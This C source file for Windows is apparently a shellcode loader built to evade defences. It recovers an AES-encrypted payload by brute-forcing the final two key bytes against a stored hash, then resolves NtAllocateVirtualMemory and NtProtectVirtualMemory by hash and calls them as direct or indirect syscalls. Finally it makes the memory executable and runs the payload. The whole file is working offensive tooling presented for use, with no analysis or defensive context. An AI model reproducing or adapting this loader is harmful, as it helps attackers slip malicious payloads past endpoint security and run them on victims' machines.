#include <windows.h>
#include "skunk.h"
#include "new_config.h"

#define CBC 1
#define AES128 1
#include "aes.h"


WORD Runner(void){
    SYSCALL_LIST   List;
    DWORD          SsnId, allocatevirtualmemory_hash, protectvirtualmemory_hash;
    LPVOID         desiredBase = NULL;
    ULONG          dwOldProtect = 0;
    SIZE_T         sz = OG_PAYLOAD_LEN; // ends up being a page (0x1000) anyway

    // hashes for ntfunctions from SuperFasthash
    allocatevirtualmemory_hash = 894705324; // [+] AllocateVirtualMemory [Length: 21] = 894705324
    protectvirtualmemory_hash = 2055251111; // [+] ProtectVirtualMemory [Length: 20] = 2055251111
    
    // bruteforce decryption key
    struct AES_ctx ctx;
    BOOL brute = TRUE;
    unsigned char* cpbuf[ENCRYPTED_BIN_LEN];
    memcpy(cpbuf, encrypted_instructions, ENCRYPTED_BIN_LEN);
    for (int i = 0x00; i<=0xff;i++) {
        key[14] = i;
        for (int j = 0x00; j <= 0xff;j++) {
            key[15] = j;
            AES_init_ctx_iv(&ctx, key, iv);
            AES_CBC_decrypt_buffer(&ctx, encrypted_instructions, ENCRYPTED_BIN_LEN);
            if (SuperFastHash(encrypted_instructions, ENCRYPTED_BIN_LEN-(encrypted_instructions[sizeof(encrypted_instructions)-1])) == PAYLOAD_HASH) { 
                brute = FALSE;
                printf("[!] Decrypted \n");
                goto POOP;
            }
            memcpy(encrypted_instructions, cpbuf, ENCRYPTED_BIN_LEN);
            
        }
    }
    // printf("[!] sad place\n");
    return;


POOP:
    if (TRUE){}
    GetSyscallList(&List);
    GetSSN(&List, allocatevirtualmemory_hash, &SsnId);
    NTSTATUS status = ZwX(SsnId, NtCurrentProcess(), &desiredBase, 0, (PSIZE_T)&sz, MEM_COMMIT, PAGE_READWRITE);  // as ntallocatevirtualmemory
    if (status != STATUS_SUCCESS) return;
    memcpy(desiredBase, encrypted_instructions, OG_PAYLOAD_LEN);
    // get syscall for ntprotectvirtualmemory
    GetSSN(&List, protectvirtualmemory_hash, &SsnId);
    status = ZwX(SsnId, NtCurrentProcess(), &desiredBase, &sz, PAGE_EXECUTE_READWRITE, &dwOldProtect); // as ntprotectvirtualmemory
    if (status != STATUS_SUCCESS) {return;}
    // printf("[+] executing!\n");
    // exec
    ((fnAddr)desiredBase)();
    status = ZwX(SsnId, NtCurrentProcess(), &desiredBase, &sz, dwOldProtect, &dwOldProtect);
    if (status != STATUS_SUCCESS) {return;}
    return 0;
}

int main(void){
    return Runner();
}

